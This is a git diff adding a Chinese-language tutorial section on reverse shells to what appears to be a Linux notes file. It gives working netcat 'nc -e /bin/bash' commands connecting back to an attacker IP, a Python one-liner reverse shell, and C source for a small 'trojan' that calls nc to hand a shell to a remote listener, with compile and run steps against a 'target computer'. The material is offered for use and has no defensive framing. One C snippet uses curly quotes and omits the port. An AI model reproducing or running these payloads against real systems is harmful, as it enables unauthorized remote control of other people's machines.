@@ -83,4 +83,46 @@ chkconfig sshd on　#设置开机启动
 >>>./hello #执行
 ```
 
+### nc反射
+>nc全名是netcat　是一个网络工具，这里面我们使用它来完成我们的反射需要两个电脑
 
+在自己电脑上开启一个端口监听
+```shell
+>>> nc -l -p 8080 #在自己电脑监听8080端口，用来等待另外一端连接我们
+>>> nc -e /bin/bash 192.168.1.101 8080 #在目标电脑上反向连接我们的电脑8080端口，ip是我们自己的ip
+>>> ls #在我们自己电脑上执行命令，这就可以对服务器进行操作了，这个叫反射
+```
+下面我们来完成一个python语言版本的shell反射
+```shell
+>>> nc -l -p 8080 #在自己电脑监听8080端口，用来等待另外一端连接我们
+>>> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+>>> ls #在本机执行命令
+```
+
+### 下面完成我们的任务，编译一个木马，然后利用nc反射一个shell
+先编写一个简单的反射shell的c代码
+```c
+#include<stdlib.h>
+main()
+{
+system(“nc -e /bin/bash 127.0.0.1”);
+}
+```
+或者用下面的版本system.c，反正都是简单的实现
+```c
+#include<stdlib.h>
+int main(int argc,char* argv[])
+{
+char shell_cmd[100];
+sprintf(shell_cmd,"nc -e /bin/bash %s %s",argv[1],argv[2]);
+system(shell_cmd);
+}
+```
+### 下面我们来完成完成编译，执行，反射
+
+```shell
+>>> gcc -o shelltest system.c #编译c代码
+>>> nc -l -p 8080 #本地电脑监听8080端口
+>>>./shelltest 127.0.0.1 8080 ＃目标电脑木马反向连接自己的电脑
+>>> ls #本地电脑执行命令验证结果
+```
